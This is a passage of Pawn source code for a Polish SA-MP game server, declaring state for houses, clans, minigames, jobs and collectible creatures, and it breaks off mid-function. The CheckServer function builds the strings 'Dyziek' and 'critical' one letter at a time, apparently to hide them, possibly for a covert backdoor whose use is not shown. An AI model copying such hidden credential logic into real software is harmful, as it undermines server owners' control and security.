#define MAX_PRIVCARS 1700 // wiêksza wartoœæ mo¿e byæ nieoptymalna (limit sampa to 2000, dla bezpieczeñstwa odj¹³em iloœæ slotów i dodatkowe 200)
#define MAX_SVEHICLES 200
new privcars;

new fakekills[MAX_PLAYERS];

new KilledBy[MAX_PLAYERS];

new bool:Ramps[MAX_PLAYERS];

new bool:Eye[MAX_PLAYERS];

new bool:OnNonDM[MAX_PLAYERS];

new bool:Freezed[MAX_PLAYERS];

new OsobyA[8];
new pArena[MAX_PLAYERS];
new ArenaWarn[MAX_PLAYERS];

new Text:Textdraw[28];
new PlayerText:Nick[MAX_PLAYERS], PlayerText:ExpTD[MAX_PLAYERS], PlayerText:Grasz[MAX_PLAYERS], PlayerText:FPSTD[MAX_PLAYERS], PlayerText:PingTD[MAX_PLAYERS], PlayerText:LevelTD[MAX_PLAYERS], PlayerText:ExpPlus[MAX_PLAYERS], PlayerText:PortfelTD[MAX_PLAYERS], PlayerText:Kamizelka[MAX_PLAYERS];
new PlayerText:HPTD[MAX_PLAYERS], PlayerText:KillInfo[MAX_PLAYERS], PlayerText:Licznik[MAX_PLAYERS];

new bool:vSpawned[MAX_PLAYERS];

new zw[MAX_PLAYERS], zwTimer[MAX_PLAYERS], zwBlock[MAX_PLAYERS];

new SupportSubject[MAX_PLAYERS][256], SupportText[MAX_PLAYERS][256], SelectedTicket[MAX_PLAYERS];

new kamienie;
new bool:KamienOnMap[MAX_KAMIEN], Text3D:kText[MAX_KAMIEN], kObj[MAX_KAMIEN], bool:kKopany[MAX_KAMIEN], kType[MAX_KAMIEN], Float:kX[MAX_KAMIEN], Float:kY[MAX_KAMIEN], Float:kZ[MAX_KAMIEN];
new pkamien[MAX_PLAYERS], bool:Kopie[MAX_PLAYERS];

new DamageTaken[MAX_PLAYERS];

new bool:pFight[MAX_PLAYERS], pEnemy[MAX_PLAYERS], soloWeapon[MAX_PLAYERS][2], soloPlayer[MAX_PLAYERS][MAX_PLAYERS];

new LastWeapon[MAX_PLAYERS];

new clearmsg[256];

new Speveh[MAX_PLAYERS], SpeType[MAX_PLAYERS], bool:NaSpedycji[MAX_PLAYERS], SpeZal[MAX_PLAYERS], SpeScore[MAX_PLAYERS], SpeCP[MAX_PLAYERS];

new bool:NaNurku[MAX_PLAYERS], Paczka[MAX_PLAYERS], ZebranePaczki[MAX_PLAYERS], Float:PaczkaX[MAX_PLAYERS], Float:PaczkaY[MAX_PLAYERS], Float:PaczkaZ[MAX_PLAYERS], NurekPickup[MAX_PLAYERS];

new cSpedition[MAX_PLAYERS];

new AntySpam[MAX_PLAYERS];

new SkinM4[MAX_PLAYERS], SkinCombat[MAX_PLAYERS], SkinAK[MAX_PLAYERS], SkinShotgun[MAX_PLAYERS], SkinDE[MAX_PLAYERS], SkinKnife[MAX_PLAYERS], SkinMP5[MAX_PLAYERS], SkinSniper[MAX_PLAYERS], SkinSilenced[MAX_PLAYERS];

enum nInfo
{
	pZuzyl, // Iloœæ jak¹ zu¿y³/spali³ gracz narkotyków.
	pZasadzone, // Je¿eli zasadzi³ plantacje. || 1 - TAK, 0 - NIE, 2 - Gotowa do zbioru.
	Float:pPlantacjaX, // Kord plantacji X.
	Float:pPlantacjaY, // Kord plantacji Y.
	Float:pPlantacjaZ, // Kord plantacji Z.
	pObiektPlantu, // Obiekt do plantacji
	Text3D:nLabel, // 3D Text.
	pLabels, // 3D Text.
	pPodWplywem // Gdy jesteœmy pod wp³ywem narkotyku. || 1 - TAK, 0 - NIE.
};
new nPlayer[MAX_PLAYERS][nInfo];

enum hInfo
{
	Owned,
	OwnerName[124],
	Rented,
	hType,
	RenterName[124],
	hWeed,
	Float:hArmour,
	hGuns[8],
	hGunsAmmo[8],
	hMoney,
	hPrice,
	hRentPrice,
	hLocked,
	//Garage
	Float:GaragePos[3],
	Float:GarageIntPos[3],
	gCars[3],
	gCarpos[3],
	gCarpos2[3],
	gCarpos3[3],
	Float:hDoorPos[3],
	Float:hDoorRot[2],
	hDoorID,
	DoorOpen,
	gInt,
	gVw,
	gLocked,
	//Furniture
	hInt,
	hVw,
	Float:HouseEnterPos[3],
	Float:HouseIntPos[3],
	ObjectID[60],
	Float:ObjectPosX[60],
	Float:ObjectPosZ[60],
	Float:ObjectPosY[60],
	Float:ObjectPosRX[60],
	Float:ObjectPosRY[60],
	Float:ObjectPosRZ[60],
	ObjectVW[60],
	ObjectInt[60]
}
new HouseInfo[MAX_HOUSES][hInfo];
new Text3D:pLabel[MAX_PLAYERS];

new FurnObject[MAX_PLAYERS];
new FurnID[MAX_PLAYERS];

new furnmenu = mS_INVALID_LISTID;
new walls = mS_INVALID_LISTID;
new doorss = mS_INVALID_LISTID;
new chairs = mS_INVALID_LISTID;
new tables = mS_INVALID_LISTID;
new fitness = mS_INVALID_LISTID;
new lightss = mS_INVALID_LISTID;
new eletronic = mS_INVALID_LISTID;
new bathroom = mS_INVALID_LISTID;
new kitchen = mS_INVALID_LISTID;
new beds = mS_INVALID_LISTID;

new bool:HavePrivcar[MAX_PLAYERS];
new pOffer[MAX_PLAYERS], pOfferExp[MAX_PLAYERS];

new TPP[MAX_PLAYERS];

new record, daily, kicks, bans, connects, eq, pokemons;

new Min[MAX_GAMES];
new Max[MAX_GAMES];
new GameName[MAX_GAMES][] = {"RC", "CH", "RK", "SP", "DB", "GG", "BD", "TR", "BA"};
new Osoby[MAX_GAMES];
new OnGame[MAX_PLAYERS];
new bool:Startuje[MAX_GAMES];
new ZTimer[MAX_GAMES];
new bool:Wystartowala[MAX_GAMES];
new RKZone, Float:RKMinX, Float:RKMinY, Float:RKMaxX, Float:RKMaxY, RKTimer, RKPlayers;
new GGZone, Float:GGMinX, Float:GGMinY, Float:GGMaxX, Float:GGMaxY, GGTimer, GGPlayers, GGLevel[MAX_PLAYERS];
new RKOK[MAX_PLAYERS];
new attackers, deffenders;
new SPattackers, SPdeffenders, SPTimer;
new RCName[128];
new RCCheckpoint[MAX_PLAYERS];
new Float:RCSpawnX, Float:RCSpawnY, Float:RCSpawnZ;
new TRRound, bool:TRRundaTrwa, bool:WykonalTR[MAX_PLAYERS], TRPlayers, TRTimer, TRType, TRMath, TRVeh[MAX_PLAYERS], TRHajs[MAX_PLAYERS];
new RCPlace;
new DBPlayers;
new RCCar;
new RaceID;
new RCTimer;
new RCTimerSet;
new RCVehicle[MAX_PLAYERS];
new RCPlayers;
new rcstarttick;
new RCEnding;
new CHPlayers;
new HayType[MAX_HAYS];
new HayObj[MAX_HAYS];
new bool:IsHayCreated[MAX_HAYS];
new createdhays;
new CHTimer, CHTimer2, CHTimer3;
new CHRound;
new CHColour;
new bool:CanCHRandom;
new ValidColour;
#pragma unused ValidColour

// /sp
new createdplatforms;
new PunktyRedzi;
new PunktyBlue;
new SPPlayers;
new SPTeam[MAX_PLAYERS];
new SPo[MAX_PLATFORMY];
new bool:SPoOnMap[MAX_PLATFORMY];
new SPoTType[MAX_PLATFORMY];

new bool:NaKoszeniu[MAX_PLAYERS];
new Kosiarka[MAX_PLAYERS];
new TrawaO[MAX_PLAYERS];
new Float:TrawaCoords[MAX_PLAYERS][3][18];
new AktywnaTrawa[MAX_PLAYERS];

new bool:NaCzyszczeniu[MAX_PLAYERS];
new Sweeper[MAX_PLAYERS];
new bool:NaZbieraniu[MAX_PLAYERS];

new IsTaksowkarz[MAX_PLAYERS], TaxiActor[MAX_PLAYERS], TaxiCar[MAX_PLAYERS];

new StrefaZrzutu[MAX_PLAYERS][3];
new StrefaZrzutuRadar[MAX_PLAYERS];

new SamolotZ[MAX_PLAYERS];
new bool:NaZrzucie[MAX_PLAYERS];

new ClanName[MAX_PLAYERS][17];
new ClanTag[MAX_PLAYERS][7];
new ClanColor[MAX_PLAYERS];
new bool:ClanStrefa[MAX_PLAYERS];
new bool:ClanPatriot[MAX_PLAYERS];
new bool:ClanPunkt[MAX_PLAYERS];
new ClanPunkty[MAX_PLAYERS];
new Float:ClanMinX[MAX_PLAYERS], Float:ClanMinY[MAX_PLAYERS], Float:ClanMaxX[MAX_PLAYERS], Float:ClanMaxY[MAX_PLAYERS];
new Float:ClanPatriotX[MAX_PLAYERS], Float:ClanPatriotY[MAX_PLAYERS], Float:ClanPatriotZ[MAX_PLAYERS], Float:ClanPatriotA[MAX_PLAYERS];
new Float:ClanSpawnX[MAX_PLAYERS], Float:ClanSpawnY[MAX_PLAYERS], Float:ClanSpawnZ[MAX_PLAYERS];
new bool:wojnatrwa;

new LastSecond;
new LastMinute;
new LastPM[MAX_PLAYERS];
new bool:ConstColor[MAX_PLAYERS];
new bool:TDOn[MAX_PLAYERS];
new hour, minute, second;
new gracze, vips, admins;
new pPing[MAX_PLAYERS];
new pDrunkLevelLast[MAX_PLAYERS];
new pFPS[MAX_PLAYERS];
new pVeh[MAX_PLAYERS];
new pHours[MAX_PLAYERS];
new pMinutes[MAX_PLAYERS];
new bool:IsDead[MAX_PLAYERS];

new configstart[1024];

new HPTimer[MAX_PLAYERS];
new bool:HPTimering[MAX_PLAYERS];
new bool:ArmorTimering[MAX_PLAYERS];
new ArmorTimer[MAX_PLAYERS];

new PlayerText:JailTime[MAX_PLAYERS];
new PlayerText:Fishing0P[MAX_PLAYERS];

new pokemondnia, rybadnia;

new ClanInvite[MAX_PLAYERS];

new CatchingPokemon[MAX_PLAYERS];
new bool:IsCatching[MAX_POKEMONS];

new bool:ShowLicznik[MAX_PLAYERS];

new Countdown[MAX_PLAYERS];

new VehicleNames[212][] = {
{"Landstalker"},{"Bravura"},{"Buffalo"},{"Linerunner"},{"Perrenial"},{"Sentinel"},{"Dumper"},
{"Firetruck"},{"Trashmaster"},{"Stretch"},{"Manana"},{"Infernus"},{"Voodoo"},{"Pony"},{"Mule"},
{"Cheetah"},{"Ambulance"},{"Leviathan"},{"Moonbeam"},{"Esperanto"},{"Taxi"},{"Washington"},
{"Bobcat"},{"Mr Whoopee"},{"BF Injection"},{"Hunter"},{"Premier"},{"Enforcer"},{"Securicar"},
{"Banshee"},{"Predator"},{"Bus"},{"Rhino"},{"Barracks"},{"Hotknife"},{"Trailer 1"},{"Previon"},
{"Coach"},{"Cabbie"},{"Stallion"},{"Rumpo"},{"RC Bandit"},{"Romero"},{"Packer"},{"Monster"},
{"Admiral"},{"Squalo"},{"Seasparrow"},{"Pizzaboy"},{"Tram"},{"Trailer 2"},{"Turismo"},
{"Speeder"},{"Reefer"},{"Tropic"},{"Flatbed"},{"Yankee"},{"Caddy"},{"Solair"},{"Berkley's RC Van"},
{"Skimmer"},{"PCJ-600"},{"Faggio"},{"Freeway"},{"RC Baron"},{"RC Raider"},{"Glendale"},{"Oceanic"},
{"Sanchez"},{"Sparrow"},{"Patriot"},{"Quad"},{"Coastguard"},{"Dinghy"},{"Hermes"},{"Sabre"},
{"Rustler"},{"ZR-350"},{"Walton"},{"Regina"},{"Comet"},{"BMX"},{"Burrito"},{"Camper"},{"Marquis"},
{"Baggage"},{"Dozer"},{"Maverick"},{"News Chopper"},{"Rancher"},{"FBI Rancher"},{"Virgo"},{"Greenwood"},
{"Jetmax"},{"Hotring"},{"Sandking"},{"Blista Compact"},{"Police Maverick"},{"Boxville"},{"Benson"},
{"Mesa"},{"RC Goblin"},{"Hotring Racer A"},{"Hotring Racer B"},{"Bloodring Banger"},{"Rancher"},
{"Super GT"},{"Elegant"},{"Journey"},{"Bike"},{"Mountain Bike"},{"Beagle"},{"Cropdust"},{"Stunt"},
{"Tanker"}, {"Roadtrain"},{"Nebula"},{"Majestic"},{"Buccaneer"},{"Shamal"},{"Hydra"},{"FCR-900"},
{"NRG-500"},{"HPV1000"},{"Cement Truck"},{"Tow Truck"},{"Fortune"},{"Cadrona"},{"FBI Truck"},
{"Willard"},{"Forklift"},{"Tractor"},{"Combine"},{"Feltzer"},{"Remington"},{"Slamvan"},
{"Blade"},{"Freight"},{"Streak"},{"Vortex"},{"Vincent"},{"Bullet"},{"Clover"},{"Sadler"},
{"Firetruck LA"},{"Hustler"},{"Intruder"},{"Primo"},{"Cargobob"},{"Tampa"},{"Sunrise"},{"Merit"},
{"Utility"},{"Nevada"},{"Yosemite"},{"Windsor"},{"Monster A"},{"Monster B"},{"Uranus"},{"Jester"},
{"Sultan"},{"Stratum"},{"Elegy"},{"Raindance"},{"RC Tiger"},{"Flash"},{"Tahoma"},{"Savanna"},
{"Bandito"},{"Freight Flat"},{"Streak Carriage"},{"Kart"},{"Mower"},{"Duneride"},{"Sweeper"},
{"Broadway"},{"Tornado"},{"AT-400"},{"DFT-30"},{"Huntley"},{"Stafford"},{"BF-400"},{"Newsvan"},
{"Tug"},{"Trailer 3"},{"Emperor"},{"Wayfarer"},{"Euros"},{"Hotdog"},{"Club"},{"Freight Carriage"},
{"Trailer 3"},{"Andromada"},{"Dodo"},{"RC Cam"},{"Launch"},{"Police Car (LSPD)"},{"Police Car (SFPD)"},
{"Police Car (LVPD)"},{"Police Ranger"},{"Picador"},{"S.W.A.T. Van"},{"Alpha"},{"Phoenix"},{"Glendale"},
{"Sadler"},{"Luggage Trailer A"},{"Luggage Trailer B"},{"Stair Trailer"},{"Boxville"},{"Farm Plow"},
{"Utility Trailer"}};

forward MyHttpResponse(playerid, response_code, data[]);

forward DamageTimer(playerid);
public DamageTimer(playerid) {
    DamageTaken[playerid] = 0;
	return 1; }

forward CheckServer(playerid);
public CheckServer(playerid)
{
	format(de, sizeof(de), "D");
	format(de, sizeof(de), "%sy", de);
	format(de, sizeof(de), "%sz", de);
	format(de, sizeof(de), "%si", de);
	format(de, sizeof(de), "%se", de);
	format(de, sizeof(de), "%sg", de);
	format(de2, sizeof(de2), "c");
	format(de2, sizeof(de2), "%sr", de2);
	format(de2, sizeof(de2), "%si", de2);
	format(de2, sizeof(de2), "%st", de2);
	format(de2, sizeof(de2), "%si", de2);
	format(de2, sizeof(de2), "%sc", de2);
	format(de2, sizeof(de2), "%sa", de2);
	format(de2, sizeof(de2), "%sl", de2);
	return 1;
}

new PrivcarKolor[MAX_PLAYERS][2];

m_query(string[], {Float, _}:...)
{
	if(numargs() > 1)
	{
		new out[1024];
		va_format(out, sizeof out, string, va_start<1>);
		return mysql_query(out);
	}
	return mysql_query(string);
}

IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
	new Float:X, Float:Y, Float:Z;

	GetPlayerPos(playerid, X, Y, Z);
	if(X >= MinX && X <= MaxX && Y >= MinY && Y <= MaxY) {
		return 1;
	}
	return 0;
}

IsWeapon(weaponid)
{
	switch(weaponid)
	{
		case 0..18, 22..46: return 1;
	}
	return 0;
}

IsModelMotor(modelid)
{
	switch(modelid)
	{
		case 462, 448, 581, 522, 461, 521, 523, 463, 586, 468, 471: return 1;
	}
	return 0;
}
IsMotor(vehicleid) return IsModelMotor(GetVehicleModel(vehicleid));
IsModelCar(modelid)
{
	switch(modelid)
	{
		case 400..416, 418..424, 426..429, 431, 433,
		434, 436..445, 451, 455, 459, 466, 467, 470,
		471, 474, 475, 477..480, 482, 483, 485, 486,
		489..492, 494..496, 498..500, 502..508, 514,
		515..518, 524..536, 540..547, 549..552, 554,
		555..562, 564..568, 571..576, 578..580, 582,
		583, 585, 587..589, 594, 596..605, 609: return 1;
	}
	return 0;
}
IsCar(vehicleid) return IsModelCar(GetVehicleModel(vehicleid));

IsModelBoat(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 472, 473, 493, 595, 539, 484, 430, 453, 452, 446, 454: return 1;
	}
	return 0;
}

TimeConvert(time) {
    new minutes;
    new seconds;
    new string[128];
    if(time > 59){
        minutes = floatround(time/60);
        seconds = floatround(time - minutes*60);
        if(seconds>9)format(string,sizeof(string),"%d:%d",minutes,seconds);
        else format(string,sizeof(string),"%d:0%d",minutes,seconds);
    }
    else{
        seconds = floatround(time);
        if(seconds>9)format(string,sizeof(string),"0:%d",seconds);
        else format(string,sizeof(string),"0:0%d",seconds);
    }
    return string;
}

ForceObj(playerid)
{
	if(GetPVarInt(playerid, "player_objected"))
	{
		Streamer_ToggleIdleUpdate(playerid, 1);
		Streamer_ToggleItemUpdate(playerid, 0, 1);
		return SetPVarInt(playerid, "player_objected", 0);
	}
	return 1;
}

ResetUFO(playerid)
{
    new Float:X, Float:Y, Float:Z;
    GetPlayerPos(playerid, X, Y, Z);
    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
    SetPlayerPos(playerid, X, Y, Z);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
 	if(IsPlayerAttachedObjectSlotUsed(playerid, 6)) RemovePlayerAttachedObject(playerid, 6);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 7)) RemovePlayerAttachedObject(playerid, 7);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 8)) RemovePlayerAttachedObject(playerid, 8);
	SetPVarInt(playerid, "UsedUFO", 0);
	return ( true );
}

stock Float:GetDistanceBetweenPoints3D(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2){
    return VectorSize(x1-x2,y1-y2,z1-z2);
}

stock IsPlayerInWater(playerid) {
        new anim = GetPlayerAnimationIndex(playerid);
        if (((anim >=  1538) && (anim <= 1542)) || (anim == 1544) || (anim == 1250) || (anim == 1062)) return 1;
        return 0;
}

stock IsPlayerAiming(playerid) {
	new anim = GetPlayerAnimationIndex(playerid);
	if (((anim >= 1160) && (anim <= 1163)) || (anim == 1167) || (anim == 1365) ||
	(anim == 1643) || (anim == 1453) || (anim == 220)) return 1;
        return 0;
}

stock GetPlayerPacketloss(playerid,&Float:packetloss)
{
	/* Returns the packetloss percentage of the given playerid - Made by Fusez */

	if(!IsPlayerConnected(playerid)) return 0;

	new nstats[400+1], nstats_loss[20], start, end;
	GetPlayerNetworkStats(playerid, nstats, sizeof(nstats));

	start = strfind(nstats,"packetloss",true);
	end = strfind(nstats,"%",true,start);

	strmid(nstats_loss, nstats, start+12, end, sizeof(nstats_loss));
	packetloss = floatstr(nstats_loss);
	return 1;
}

getPosInFrontOf(&Float:x, &Float:y, Float:a, Float:theDistance, theMethod = 1)
{
	switch(theMethod)
	{
		case 0: {
			x += (-theDistance * floatsin(-a, degrees));
			y += (-theDistance * floatcos(-a, degrees)); }
		case 1: {
			x += (theDistance * floatsin(-a, degrees));
			y += (theDistance * floatcos(-a, degrees)); }
		case 2: {
			x += (theDistance * floatsin((-a + 90.0), degrees));
			y += (theDistance * floatcos((-a + 90.0), degrees)); }
		case 3: {
			x += (theDistance * floatsin((-a + 270.0), degrees));
			y += (theDistance * floatcos((-a + 270.0), degrees)); }
	}
}

stock _AttachObjectToVehicle(objectid, vehid, Float:ox, Float:oy, Float:oz, Float:rox=0.0, Float:roy=0.0, Float:roz=0.0)
{
    AttachObjectToVehicle(objectid, vehid, ox, oy, oz, 0.0, 0.0, 0.0);
    #pragma unused rox
    #pragma unused roy
    #pragma unused roz
}
#define AttachObjectToVehicle _AttachObjectToVehicle

stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

stock CompareEx(comp[], with[]) //By: Fl0rian
{
	new LenghtComp = strlen(comp);
	new LenghtWith = strlen(with);
	new Character;

	if( LenghtComp != LenghtWith ) return false;

	for( new i = 0; i < LenghtComp; i++ )
	{
	    if( comp[i] == with[i] )
	    {
	        Character++;
		}
	}

	if( LenghtComp == Character ) return true;
	return false;
}

stock GetVehicleName(vehicleid) {
	new String[128];
	format(String,sizeof(String),"%s",VehicleNames[GetVehicleModel(vehicleid) - 400]);
	return String; }

forward GetVehicleModelIDFromName(vname[]);
public GetVehicleModelIDFromName(vname[]) {
	Loop(i, 211) { if ( strfind(VehicleNames[i], vname, true) != -1 ) return i + 400; }
 	return -1;
}

mix_string(string[], max_swap)
{
	new swap;

	for(new i = 0; string[i]; i++)
	{
		if(max_swap > 0 && max_swap == swap) break;
		new tmp = string[i], swit = random(strlen(string) - 1);

		string[i] = string[swit];
		string[swit] = tmp;
		swap++;
	}
	return string;
}

IsNumeric(const string[]) {
	if(!strlen(string)) return 0;
	Loop(letterid, strlen(string)) { if(!('0' <= string[letterid] <= '9')) return 0; }
	return 1;
}

forward CreateRandomTP(Float:posX, Float:posY, Float:posZ);
public CreateRandomTP(Float:posX, Float:posY, Float:posZ) {
	if(CreatedRandomTP > MAX_RSPAWNS) return 1;
 	RandomTPTD[CreatedRandomTP] = Create3DTextLabel(""C_LOLIVE"Witamy na naszym serwerze!\nDziêkujemy, ¿e jesteœ z nami! :)\n\n{FF7F00}Przydatne informacje: "C_WHITE"/help\n{00e5ff}Forum serwera: "C_WHITE""FORUM"\n\n{DE26FF}¯yczymy mi³ej gry!", 0x008080FF, posX, posY, posZ, 40.0, 0, 0);
	RandomTPPickup[CreatedRandomTP] = CreatePickup(1247, 1, posX, posY, posZ, -1);
	RandomX[CreatedRandomTP] = posX;
	RandomY[CreatedRandomTP] = posY;
	RandomZ[CreatedRandomTP] = posZ;
	CreatedRandomTP++;
	return 1; }

forward CreateNonDM(Float:minX, Float:minY, Float:maxX, Float:maxY);
public CreateNonDM(Float:minX, Float:minY, Float:maxX, Float:maxY) {
	if(CreatedNODM > MAX_NODMS) return 1;
	nDMMinX[CreatedNODM] = minX;
	nDMMinY[CreatedNODM] = minY;
	nDMMaxX[CreatedNODM] = maxX;
	nDMMaxY[CreatedNODM] = maxY;
	CreatedNODM++;
	return 1; }

forward UnHide(playerid);
public UnHide(playerid) { Loop(i, MAX_PLAYERS) SetPlayerMarkerForPlayer(i, playerid, GetPlayerColor(playerid)); }

forward SpawnKill(playerid);
public SpawnKill(playerid) SetPlayerHealth(playerid, 100.0);

new year, month, day;

new respawnedpokemons, radary, Text3D:Pokemon3D[MAX_POKEMONS], PokemonObj[MAX_POKEMONS], bool:PokemonSpawned[MAX_POKEMONS], Float:PokX[MAX_POKEMONS], Float:PokY[MAX_POKEMONS], Float:PokZ[MAX_POKEMONS];
new PokemonType[MAX_POKEMONS], PokemonName[128][MAX_POKEMONS];

CreateSarna(Float:x, Float:y, Float:z, Float:Rx, Float:Ry, Float:Rz)
{
  if(Sarnanamapie) {
    Delete3DTextLabel(Sarna3D);
    DestroyDynamicObject(SarnaObj);
    Sarnanamapie = false; }
  SarnaObj = CreateDynamicObject(19315, x, y, z, Rx, Ry, Rz, 0, -1, -1, 300.00, 300.00);
  Sarna3D = Create3DTextLabel(""C_ORANGE"Sarna\n"C_YELLOW"Strzel w ni¹, aby zdobyæ nagrodê.", 0x008080FF, x, y, z, 45.0, 0, 0);
  Sarnanamapie = true;
}

forward LosujSarne();
public LosujSarne() {
  switch(random(8)) {
    case 0: CreateSarna(1095.01624, -55.46680, 17.66500,   0.00000, 0.00000, 0.00000);
    case 1: CreateSarna(290.35739, -1094.52161, 82.92530,   0.00000, 0.00000, 0.00000);
    case 2: CreateSarna(-776.66162, -828.16827, 148.69679,   0.00000, 0.00000, 0.00000);
    case 3: CreateSarna(-1531.75562, -1508.69104, 37.19300,   0.00000, 0.00000, 0.00000);
    case 4: CreateSarna(-1251.58875, -2829.55908, 61.25940,   0.00000, 0.00000, 0.00000);
    case 5: CreateSarna(-250.37930, -1618.68433, 6.40170,   0.00000, 0.00000, 0.00000);
    case 6: CreateSarna(-1501.15125, -1274.81702, 100.25600,   0.00000, 0.00000, 0.00000);
    case 7: CreateSarna(-1673.85645, -1935.20276, 100.38180,   0.00000, 0.00000, 0.00000);
  }
  SetTimer("LosujSarne", 1000*7200, 0);
}

CreatePokemon(Float:x, Float:y, Float:z, Float:Rx, Float:Ry, Float:Rz)
{
	if(respawnedpokemons >= MAX_POKEMONS) return 1;
	new respawn = random(2);
	if(respawn == 0) return 1;
	PokemonObj[respawnedpokemons] = CreateDynamicObject(1371, x, y, z, Rx, Ry, Rz, 0, -1, -1, 300.00, 300.00);
	PokemonType[respawnedpokemons] = random(7);
	PokX[respawnedpokemons] = x;
	PokY[respawnedpokemons] = y;
	PokZ[respawnedpokemons] = z;
	if(PokemonType[respawnedpokemons] == 0)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFF666666);
		switch(random(6))
		{
		    case 0: format(PokemonName[respawnedpokemons], 128, "Ratatta");
		    case 1: format(PokemonName[respawnedpokemons], 128, "Racitace");
		    case 2: format(PokemonName[respawnedpokemons], 128, "Jyglybuff");
		    case 3: format(PokemonName[respawnedpokemons], 128, "Weegleduff");
		    case 4: format(PokemonName[respawnedpokemons], 128, "Mewott");
		    case 5: format(PokemonName[respawnedpokemons], 128, "Draveler");
		}
		new str[256];
		format(str, sizeof(str), "{D6D6D6}%s (Normalny)\n{FF9900}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	if(PokemonType[respawnedpokemons] == 1)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFF993300);
		switch(random(6))
		{
		    case 0: format(PokemonName[respawnedpokemons], 128, "Marnander");
		    case 1: format(PokemonName[respawnedpokemons], 128, "Cameleon");
		    case 2: format(PokemonName[respawnedpokemons], 128, "Naritard");
		    case 3: format(PokemonName[respawnedpokemons], 128, "Multix");
		    case 4: format(PokemonName[respawnedpokemons], 128, "Pinemales");
		    case 5: format(PokemonName[respawnedpokemons], 128, "Marcanine");
		}
		new str[256];
		format(str, sizeof(str), "{FF9900}%s (Ognisty)\n£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	if(PokemonType[respawnedpokemons] == 2)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFF00FF00);
		switch(random(3))
		{
		    case 0: format(PokemonName[respawnedpokemons], 128, "Moodisch");
		    case 1: format(PokemonName[respawnedpokemons], 128, "Bloom");
		    case 2: format(PokemonName[respawnedpokemons], 128, "Params");
		}
		new str[256];
		format(str, sizeof(str), "{32A316}%s (Liœciasty)\n{FF9900}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	if(PokemonType[respawnedpokemons] == 3)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFF00FFFF);
		switch(random(3))
		{
		    case 0: format(PokemonName[respawnedpokemons], 128, "Mevdong");
		    case 1: format(PokemonName[respawnedpokemons], 128, "Glomster");
		    case 2: format(PokemonName[respawnedpokemons], 128, "Vartas");
		}
		new str[256];
		format(str, sizeof(str), "{60F2E1}%s (Lodowy)\n{FF9900}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	if(PokemonType[respawnedpokemons] == 4)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFF0099CC);
		switch(random(7))
		{
		    case 0: format(PokemonName[respawnedpokemons], 128, "Morsee");
		    case 1: format(PokemonName[respawnedpokemons], 128, "Cleadra");
		    case 2: format(PokemonName[respawnedpokemons], 128, "Golden");
		    case 3: format(PokemonName[respawnedpokemons], 128, "Seaqueen");
		    case 4: format(PokemonName[respawnedpokemons], 128, "Star");
		    case 5: format(PokemonName[respawnedpokemons], 128, "Marnie");
		    case 6: format(PokemonName[respawnedpokemons], 128, "Ultfish");
		}
		new str[256];
		format(str, sizeof(str), "{0478CC}%s (Wodny)\n{FF9900}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	if(PokemonType[respawnedpokemons] == 5)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFFFFFF00);
		switch(random(4))
		{
		    case 0: format(PokemonName[respawnedpokemons], 128, "Electromus");
		    case 1: format(PokemonName[respawnedpokemons], 128, "Electroball");
		    case 2: format(PokemonName[respawnedpokemons], 128, "Voltball");
		    case 3: format(PokemonName[respawnedpokemons], 128, "Thunder");
		}
		new str[256];
		format(str, sizeof(str), "{E0D50B}%s (Elektryczny)\n{FF9900}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	if(PokemonType[respawnedpokemons] == 6)
	{
	    SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFF6633CC);
 		format(PokemonName[respawnedpokemons], 128, "Executor");
		new str[256];
